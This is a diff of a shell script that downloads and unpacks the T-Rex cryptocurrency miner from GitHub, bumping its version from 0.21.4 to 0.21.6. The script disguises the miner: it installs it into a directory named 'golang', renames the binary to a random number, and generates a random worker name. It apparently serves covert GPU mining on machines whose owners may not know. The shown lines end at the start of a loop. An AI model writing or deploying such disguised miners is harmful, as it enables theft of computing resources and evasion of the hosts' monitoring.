@@ -4,10 +4,10 @@ P=$(echo GPU-$(shuf -i 1-1000 -n 1)-NEO)
 y=$(( RANDOM - ( RANDOM + RANDOM ) ))
 x=1
 mkdir golang && cd golang
-# wget https://trex-miner.com/download/t-rex-0.21.3-linux.tar.gz
-wget https://github.com/trexminer/T-Rex/releases/download/0.21.4/t-rex-0.21.4-linux.tar.gz
+# wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
+wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
 #tar -xf t-rex-0.21.3-linux.tar.gz
-tar -xf t-rex-0.21.4-linux.tar.gz
+tar -xf t-rex-0.21.6-linux.tar.gz
 mv t-rex $y
 # --gpu-report-interval 10
 while [ $x -le 20 ]
